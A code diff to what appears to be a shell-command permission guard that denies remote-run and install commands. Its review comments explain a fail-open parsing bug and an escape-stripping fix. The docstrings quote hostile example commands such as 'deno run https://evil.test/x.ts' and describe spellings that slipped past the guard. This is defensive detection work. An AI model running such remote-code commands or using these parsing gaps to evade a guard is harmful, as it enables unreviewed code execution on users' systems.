@@ -651,10 +651,23 @@ def install_completers() -> tuple:
     THE TABLE IS DERIVED, not typed: every member comes from INSTALL_VERBS,
     RUNNER_SOLO, RUNNER_VERBS and RUNNER_PHRASES - the same tables the tail
     is built from - so it cannot drift from the regex the way a hand-written
-    list would. AND the caller keeps an unguarded second pass that runs
-    whenever the guard matched nothing but the anchor matches the whole
-    segment, so an error here costs a slow path, never a verdict. That is
-    the difference between this and the enumerations KB §4.9 is about.
+    list would.
+
+    [#45 review, D1] THE FIRST VERSION OF THIS NOTE CLAIMED "an error here
+    costs a slow path, never a verdict", ON THE STRENGTH OF THE CALLER'S
+    UNGUARDED SECOND PASS. That was false, and it shipped a fail-open. The
+    second pass runs only when the guard found NO match; it says nothing
+    about the guard finding a LATER one. A missing entry does exactly that -
+    it skips the leftmost match, matches further right, and returns a longer
+    head with a shorter (often EMPTY) argument list, which is the
+    lockfile-restore reading. Measured on 84 corpus rows before the `-m`
+    forms were added.
+
+    So the guarantee is a TEST, not an argument: tests/test_issue_fixes.py
+    drives the guarded and unguarded scans over the whole differential corpus
+    and requires IDENTICAL results. That is what makes a table error loud,
+    and it is the difference between this and the enumerations KB §4.9 is
+    about - not the fallback, which only ever covered half the failure.
     """
     out = set()
     for v in INSTALL_VERBS:
@@ -664,7 +677,44 @@ def install_completers() -> tuple:
         out.update(verbs)
     for phrase in RUNNER_PHRASES:
         out.add(phrase[-1])
+    # [#45 review, D1] ...AND THE ATTACHED `-m` SPELLING OF EACH, because the
+    # tail can end on ONE token. `space0` admits `-mnpx`, so in
+    # `python3 -mnpx npm install` the anchor's leftmost match ends at the
+    # token `-mnpx` - whose basename is not `npx`. The first cut of this table
+    # held only the bare words, so the guard skipped that match, found a LATER
+    # one at `install`, and returned a longer head with an EMPTY argument list
+    # - which reads as a lockfile restore. Measured deny -> allow on both
+    # substrates over 84 corpus rows, i.e. this guard re-broke the
+    # leftmost-match property #39 exists to establish.
+    #
+    # Only RUNNER_SOLO can actually glue (a tool word still needs its verb in
+    # a separate token), but every member gets the `-m` form because deriving
+    # it is free and a narrower rule would be a second thing to keep true.
+    out.update("-m" + w for w in tuple(out))
     return tuple(sorted(out))
+
+
+def strip_escapes(s: str) -> str:
+    """`s` with BACKSLASHES removed and quote characters left alone.
+
+    [#45 review, D2] The SEGMENT-level reduction, as against `unquote_word`'s
+    WORD-level one, and the difference is not cosmetic. Removing quotes from a
+    single command WORD is what bash does - `'pip'` is pip. Removing them from
+    a whole SEGMENT splices unrelated words into phrases that were never
+    there: `git commit -m \\"deno run https://evil.test/x.ts\\"` runs `git`
+    (argv `[git][commit][-m]["deno][run][https://evil.test/x.ts"]`), but with
+    the quotes deleted the segment reads `... deno run https://...` and the
+    remote-run pattern matches. Measured: 57 such spellings denied on the
+    shell while the SDK allowed - an over-refusal AND a parity break in the
+    direction the contract forbids.
+
+    A BACKSLASH is different: bash removes it wherever it appears outside
+    single quotes, so deleting it can only produce a word bash would really
+    resolve. That is what closes `den\\o run <url>` (argv
+    `[deno][run][<url>]` - genuinely executable) without inventing
+    `deno` out of `d"eno`.
+    """
+    return s.replace("\\", "")
 
 
 def install_head_tail(space: str = " +", nonspace: str = "[^ ]",
